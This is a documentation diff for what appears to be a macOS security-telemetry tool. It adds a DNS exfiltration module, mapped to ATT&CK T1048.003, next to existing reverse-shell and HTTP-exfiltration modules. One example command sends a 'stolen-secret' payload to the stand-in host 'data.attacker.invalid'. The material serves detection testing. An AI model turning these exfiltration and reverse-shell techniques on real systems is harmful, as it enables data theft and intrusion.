@@ -27,6 +27,14 @@ DNS resolution of configurable domains. Maps to T1071.004.
 ### `net_revshell`
 Connects a shell to a remote listener (connection refused is expected without one). Maps to T1059.004.
 
+### `net_dns_exfil`
+Encodes a payload into base32 DNS subdomain labels and resolves each query. The `.invalid` TLD (RFC 6761) means queries never leave the resolver unless the base domain is overridden. Maps to T1048.003.
+
+```bash
+macnoise run net_dns_exfil
+macnoise run net_dns_exfil --param payload="stolen-secret" --param base_domain="data.attacker.invalid"
+```
+
 ### `net_exfil`
 Sends an HTTP POST with a randomly-generated dummy payload to a target URL. Records request size, response status, and elapsed time. Connection refused is valid telemetry — no listener required. Maps to T1041.
 
